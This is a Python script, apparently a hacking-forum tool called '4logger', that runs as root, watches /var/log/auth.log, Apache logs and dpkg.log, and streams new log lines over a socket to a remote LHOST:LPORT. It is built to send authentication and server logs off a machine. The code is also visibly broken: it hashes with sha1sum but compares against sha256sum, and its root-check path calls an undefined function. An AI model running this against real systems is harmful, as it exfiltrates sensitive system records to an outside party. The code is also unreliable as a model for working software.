#!/bin/env python3
import sys
import os
import socket
from time import sleep

r = '\033[031m'
g = '\033[032m'
b = '\033[036m'
k = '\033[030m'
n = '\033[00m'

banner = r"""
		  {r}____ {b}__                      {n}
		 {r}/ / /{b}/ /__  ___ {g}____ ____ ____{n}
		{r}/_  _/ {b}/ _ \/ _ `/{g} _ `/ -_) __/{n}
		 {r}/_/{b}/_/\___/\_, /{g}\_, /\__/_/   {n}
		           {b}/___/{g}/___/ {n}
		 {r}MSF{b}: http://www.{n}mmsecurity.n{g}et/forum/member.php?action=register&referrer=9450{n}
		 {r}Github{b}: https://github.com/4cc3ssflick/{g}4logger{n}
		 							{r}v2.0{n}
""".format(r=r,b=b,n=n,g=g)

class alogger:
	# LOG_PATH = '/var/log/'
	# LOG_FILES = []
	LOG_FILES = ['/var/log/auth.log', '/var/log/apache2/access.log', '/var/log/apache2/error.log', '/var/log/dpkg.log']
	LOGS_HASH = {}
	LOGS_MOD_HASH = {}
	def __init__(self):
		try:
			self.args = sys.argv[1].split(':')
		except IndexError:
			self.usage()
			sys.exit(0)
	def start(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
		# self.prepare(self.LOG_PATH)
		print(f"[{b}*{n}] Checking all available logs... ", end='')
		for LOGS in self.LOG_FILES:
			self.LOGS_HASH[LOGS] = os.popen("sha1sum -t %s | awk '{ print $1 }'" % LOGS).read().rstrip()
		print(f"{g}DONE{n}")
		print(f'[{b}*{n}] '+', '.join(self.LOG_FILES))
		print(f"[{b}*{n}]Connecting to {g}{self.args[0]}{n}:{r}{self.args[1]}{n}...", end='')
		try:
			s.connect((self.args[0], int(self.args[1])))
			print(f"{g}CONNECTED{n}")
		except ConnectionRefusedError:
			print(f"\n[{r}-{n}] Connection refused!")
			sys.exit(0)
		try:
			while True:
				for l in self.LOG_FILES:
					MODIFIED = os.popen("sha256sum -t %s | awk '{ print $1 }'" % l).read().rstrip()
					if self.LOGS_HASH[l] != MODIFIED:
						self.LOGS_HASH[l] = MODIFIED
						f = open(l, encoding='ISO-8859-1')
						try:
							lol = f.readlines()[-1]
						except IndexError:
							lol = f.read()
						try:
							s.sendall(lol.encode())
						except:
							print("[*] Disconnecting... ",end='')
							s.close()
							print(f'{g}OK{n}')
							sys.exit(0)
						f.close()
		except KeyboardInterrupt:
			print(f"[{r}-{n}] User interrupted!")
			sys.exit(0)
	# def prepare(self, LOG_PATH):
	# 	sub, file = [], []
	# 	for f in os.scandir(LOG_PATH):
	# 		if f.is_dir():
	# 			sub.append(f.path)
		# 	if f.is_file():
		# 		file.append(f.path)
		# 		self.LOG_FILES.append(f.path)
		# for dir in list(sub):
		# 	sf, f = self.prepare(dir)
		# 	sub.extend(sf)
		# 	file.extend(f)
		# return sub, file
	def usage(self):
		print('usage: ./%s [LHOST]:[LPORT]' % sys.argv[0])
		sys.exit(1)
	def sudo(self):
		print('[!] Need to run this script as root!')
		usage()
		sys.exit(1)
if __name__ == '__main__':
	print(banner)
	if os.geteuid() == 0:
		alogger().start()
	else:
		alogger.sudo()